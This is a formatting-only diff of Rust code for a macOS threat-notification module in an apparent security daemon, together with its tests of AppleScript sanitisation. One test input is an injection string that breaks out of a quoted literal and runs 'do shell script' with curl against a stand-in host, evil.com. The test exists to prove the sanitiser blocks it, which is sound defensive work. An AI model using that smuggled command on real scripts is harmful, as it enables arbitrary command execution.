@@ -66,7 +66,8 @@ fn sanitize_for_applescript(input: &str) -> String {
 /// Non-blocking — if the notification fails, it's logged but doesn't
 /// interrupt the daemon's operation.
 pub fn notify_threat(event: &ThreatEvent) {
-    #[allow(clippy::cast_possible_truncation)] // millis since epoch won't overflow u64 for ~585M years
+    #[allow(clippy::cast_possible_truncation)]
+    // millis since epoch won't overflow u64 for ~585M years
     let now_ms = SystemTime::now()
         .duration_since(UNIX_EPOCH)
         .unwrap_or_default()
@@ -137,9 +138,7 @@ fn send_notification(summary: &str, body: &str) -> Result<(), String> {
         // strips everything except a strict allowlist of safe characters.
         let safe_body = sanitize_for_applescript(body);
         let safe_summary = sanitize_for_applescript(summary);
-        let script = format!(
-            "display notification \"{safe_body}\" with title \"{safe_summary}\"",
-        );
+        let script = format!("display notification \"{safe_body}\" with title \"{safe_summary}\"",);
         match std::process::Command::new("osascript")
             .args(["-e", &script])
             .spawn()
@@ -198,16 +197,18 @@ mod tests {
         let body = "evil payload | Path: /tmp/evil.pth | Action: Quarantined";
         let safe_body = sanitize_for_applescript(body);
         let safe_summary = sanitize_for_applescript(summary);
-        let script = format!(
-            "display notification \"{safe_body}\" with title \"{safe_summary}\"",
-        );
+        let script = format!("display notification \"{safe_body}\" with title \"{safe_summary}\"",);
         assert!(script.starts_with("display notification \""));
         assert!(script.contains("\" with title \""));
         assert!(script.ends_with('"'));
         // No unescaped quotes inside the two string literals
         let inner = &script["display notification \"".len()..];
         let parts: Vec<&str> = inner.splitn(2, "\" with title \"").collect();
-        assert_eq!(parts.len(), 2, "script should have exactly two string literals");
+        assert_eq!(
+            parts.len(),
+            2,
+            "script should have exactly two string literals"
+        );
         assert!(
             !parts[0].contains('"'),
             "body literal must not contain bare quotes"
@@ -226,10 +227,11 @@ mod tests {
         let malicious_body = "payload\"\ndo shell script \"curl evil.com";
         let safe_body = sanitize_for_applescript(malicious_body);
         let safe_summary = sanitize_for_applescript(malicious_summary);
-        let script = format!(
-            "display notification \"{safe_body}\" with title \"{safe_summary}\"",
+        let script = format!("display notification \"{safe_body}\" with title \"{safe_summary}\"",);
+        assert!(
+            !script.contains('\n'),
+            "newlines must not survive in script"
         );
-        assert!(!script.contains('\n'), "newlines must not survive in script");
         // Count quotes: should be exactly 4 (the delimiters)
         let quote_count = script.chars().filter(|&c| c == '"').count();
         assert_eq!(
@@ -327,7 +329,11 @@ mod tests {
 
     #[test]
     fn every_severity_produces_non_empty_summary() {
-        let levels = [ThreatLevel::Info, ThreatLevel::Warning, ThreatLevel::Critical];
+        let levels = [
+            ThreatLevel::Info,
+            ThreatLevel::Warning,
+            ThreatLevel::Critical,
+        ];
         for level in &levels {
             let event = make_event(*level, ThreatCategory::PthInjection, "test", "/tmp/t");
             let summary = match event.level {
@@ -348,12 +354,19 @@ mod tests {
 
     #[test]
     fn severity_summary_contains_level_indicator() {
-        let event_critical =
-            make_event(ThreatLevel::Critical, ThreatCategory::PthInjection, "d", "/p");
-        let event_warning =
-            make_event(ThreatLevel::Warning, ThreatCategory::PthInjection, "d", "/p");
-        let event_info =
-            make_event(ThreatLevel::Info, ThreatCategory::PthInjection, "d", "/p");
+        let event_critical = make_event(
+            ThreatLevel::Critical,
+            ThreatCategory::PthInjection,
+            "d",
+            "/p",
+        );
+        let event_warning = make_event(
+            ThreatLevel::Warning,
+            ThreatCategory::PthInjection,
+            "d",
+            "/p",
+        );
+        let event_info = make_event(ThreatLevel::Info, ThreatCategory::PthInjection, "d", "/p");
 
         let fmt = |e: &ThreatEvent| match e.level {
             ThreatLevel::Critical => format!("Sanctum: CRITICAL - {}", category_display(e)),
@@ -381,14 +394,23 @@ mod tests {
     fn notify_threat_runs_all_severity_category_combinations() {
         // Exercise every combination of level and category to ensure
         // no match arm is missing and nothing panics.
-        let levels = [ThreatLevel::Info, ThreatLevel::Warning, ThreatLevel::Critical];
+        let levels = [
+            ThreatLevel::Info,
+            ThreatLevel::Warning,
+            ThreatLevel::Critical,
+        ];
         let categories = [
             ThreatCategory::PthInjection,
             ThreatCategory::SiteCustomize,
             ThreatCategory::CredentialAccess,
             ThreatCategory::NetworkAnomaly,
         ];
-        let actions = [Action::Logged, Action::Alerted, Action::Quarantined, Action::Blocked];
+        let actions = [
+            Action::Logged,
+            Action::Alerted,
+            Action::Quarantined,
+            Action::Blocked,
+        ];
 
         for level in &levels {
             for cat in &categories {
@@ -495,10 +517,7 @@ mod tests {
         // Non-ASCII characters could contain homoglyphs or other tricks.
         let input = "legit\u{200B}path/\u{00E9}vil.pth";
         let result = sanitize_for_applescript(input);
-        assert!(
-            result.is_ascii(),
-            "non-ASCII must be stripped: {result}"
-        );
+        assert!(result.is_ascii(), "non-ASCII must be stripped: {result}");
     }
 
     #[test]
@@ -571,7 +590,10 @@ mod tests {
         // First call should go through and update the timestamp
         notify_threat(&event);
         let after_first = LAST_NOTIFICATION.load(Ordering::Relaxed);
-        assert!(after_first > 0, "timestamp should be set after first notification");
+        assert!(
+            after_first > 0,
+            "timestamp should be set after first notification"
+        );
 
         // Immediate second call should be rate-limited (timestamp unchanged)
         notify_threat(&event);
